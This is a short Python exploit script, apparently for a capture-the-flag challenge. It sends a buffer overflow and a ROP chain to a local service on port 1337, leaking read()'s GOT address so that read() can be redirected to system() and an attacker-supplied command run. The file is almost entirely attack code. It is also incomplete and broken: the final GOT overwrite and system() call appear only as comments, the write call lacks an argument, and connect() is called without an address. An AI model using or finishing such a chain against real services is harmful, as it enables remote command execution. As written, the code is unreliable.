#!/usr/bin/env python

import sys, os, socket 

from struct import pack

addr = ('127.0.0.1', 1337)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

cmd = sys.argv[1] + '\0'

payload = 'A' * 140

# write stdin to .dynamic using read@plt
payload += pack('<I', 0x0804832c) # call read@plt
payload += pack('<I', 0x80484b6)  # pop esi; pop edi; pop ebp; ret
payload += pack('<I', 0)          # stdin
payload += pack('<I', 0x08049620) # addr of .dynamic
payload += pack('<I', len(cmd))   # len of cmd

# leak addr of read() in randomized libc
payload += pack('<I', 0x0804830c) # call write@plt location to write to stdout
payload += pack('<I', 0x80484b6)  # pop esi; pop edi; pop ebp; ret
payload += pack('<I', 1)          # stdout
payload += pack('<I', 0x0804961c) # read() in GOT


# call read@plt to overwrite the ptr stored in read()'s in GOT

# call read() again, but at this point it is actually system()


s.connect()

s.send(payload + '\n')

s.close()
